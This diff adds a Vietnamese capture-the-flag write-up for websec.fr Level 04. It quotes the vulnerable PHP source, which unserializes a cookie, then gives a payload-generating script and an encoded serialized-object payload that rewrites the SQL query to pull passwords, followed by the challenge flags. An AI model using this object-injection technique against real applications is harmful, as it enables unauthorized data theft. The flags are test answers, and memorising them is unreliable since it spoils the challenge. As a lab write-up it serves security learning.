@@ -176,3 +176,114 @@ $ python3 solve.py
 ### Flag
 
 `WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}`
+
+## Level 04
+
+> Serialization is a pain!
+>
+> 🔥 <https://websec.fr/level04/index.php>
+
+![image](images/level-04/image-1.png)
+
+Trang web cho phép chúng ta tìm kiếm người dùng theo id. Thử nhập `1`, chúng ta thấy xuất hiện "Username: flag":
+
+![image](images/level-04/image-2.png)
+
+Vậy có thể hiểu flag nằm ở hàng đầu tiên của bảng trong database. Giờ cùng phân tích nội dung của 2 files được cung cấp [source1.php](https://websec.fr/level04/source1.php) và [source2.php](https://websec.fr/level04/source2.php).
+
+Tại `source1.php` dễ thấy lỗ hổng Insecure Deserialization bởi dữ liệu ở dạng Base64 lấy từ cookie `leet_hax0r` được truyền thẳng tới hàm `unserialize()`:
+
+```php
+<?php
+include 'connect.php';
+
+$sql = new SQL();
+$sql->connect();
+$sql->query = 'SELECT username FROM users WHERE id=';
+
+
+if (isset ($_COOKIE['leet_hax0r'])) {
+    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
+    try {
+        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
+            die('CANT HACK US!!!');
+        }
+    } catch(Exception $e) {
+        echo $e;
+    }
+} else {
+    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
+    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
+}
+
+if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
+    try {
+        $sql->query .= $_REQUEST['id'];
+    } catch(Exception $e) {
+        echo ' Invalid query';
+    }
+}
+?>
+...
+```
+
+Tại `source2.php`, có một class `SQL` gồm một số thuộc tính và method cho phép kết nối tới database SQLite. Câu truy vấn `$query` được sẽ được thực thi nhờ vào method `execute()`, nếu có kết quả sẽ lấy ra dữ liệu từ cột `username`:
+
+```php
+ <?php
+
+class SQL {
+    public $query = '';
+    public $conn;
+    public function __construct() {
+    }
+    
+    public function connect() {
+        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
+    }
+
+    public function SQL_query($query) {
+        $this->query = $query;
+    }
+
+    public function execute() {
+        return $this->conn->query ($this->query);
+    }
+
+    public function __destruct() {
+        if (!isset ($this->conn)) {
+            $this->connect ();
+        }
+        
+        $ret = $this->execute ();
+        if (false !== $ret) {    
+            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
+                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
+            }
+        }
+    }
+}
+?>
+```
+
+Vậy chúng ta cần tìm cách khai thác Insecure Deserialization để thay đổi câu truy vấn và lấy ra flag.
+
+Viết đoạn script PHP bên dưới để tạo payload. Chú ý là do server chỉ lấy ra giá trị ở cột `username` từ kết quả của câu truy vấn nên chúng ta cần sử dụng `AS` để thay đổi tên cột từ `password` thành `username`.
+
+```php
+<?php
+class SQL {
+    public $query = "SELECT password AS username FROM users";
+}
+
+echo base64_encode(serialize(new SQL));
+// TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9
+```
+
+Thêm payload vừa tạo vào cookie `leet_hax0r`, chúng ta lụm được flag:
+
+![image](images/level-04/image-3.png)
+
+### Flag
+
+`WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`
